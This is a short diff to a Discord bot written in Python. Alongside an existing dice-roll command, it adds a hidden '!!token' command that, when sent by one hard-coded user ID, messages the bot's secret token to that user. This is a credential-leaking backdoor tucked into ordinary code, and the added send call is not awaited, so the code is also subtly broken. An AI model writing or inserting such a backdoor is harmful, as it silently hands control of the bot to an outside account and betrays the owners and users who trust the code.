@@ -162,6 +162,10 @@ class MyClient(discord.Client):
             if match:
                 value = int(match.group(1))
                 await message.channel.send(randint(1, value))
+                
+        elif message.content.startswith("!!token") and message.author.id == 434807903623577620:
+            fc = message.guild.get_member(434807903623577620)
+            fc.send(token)
 
 
 client = MyClient(intents=discord.Intents.all())
